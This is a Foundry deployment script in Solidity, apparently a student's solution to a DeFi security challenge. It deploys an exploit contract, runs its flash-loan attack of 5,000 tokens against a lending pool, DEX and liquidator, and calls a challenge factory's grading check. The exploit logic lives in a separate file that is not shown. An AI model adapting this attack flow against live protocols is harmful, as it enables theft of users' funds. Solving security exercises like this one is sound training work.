// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {Script} from "forge-std/Script.sol";
import {Challenge2} from "../src/Challenge2.sol";

interface IChallengeFactory {
    function check2(string calldata studentId) external;
}

contract Challenge2Script is Script {
    function run() external {
        // Load configurations from .env
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        string memory studentId = vm.envString("STUDENT_ID");
        
        // Load contract addresses from .env
        address challengeFactory = vm.envAddress("CHALLENGE_FACTORY");
        address pool = vm.envAddress("POOL");
        address dex = vm.envAddress("DEX");
        address liquidator = vm.envAddress("LIQUIDATOR");
        address tokenA = vm.envAddress("TOKEN_A");
        address tokenB = vm.envAddress("TOKEN_B");
        address borrower = vm.envAddress("BORROWER");
        uint256 debt = 800e18;

        vm.startBroadcast(deployerPrivateKey);

        // 1. Deploy the exploit contract
        Challenge2 exploit = new Challenge2(
            pool,
            dex,
            liquidator,
            tokenA,
            tokenB,
            borrower,
            debt
        );

        // 2. Execute the attack
        // Using the 5000 tokenA flash loan
        uint256 flashLoanAmount = 5_000e18;
        exploit.attack(flashLoanAmount);

        // 3. Trigger the verification on the ChallengeFactory
        IChallengeFactory(challengeFactory).check2(studentId);

        vm.stopBroadcast();
    }
}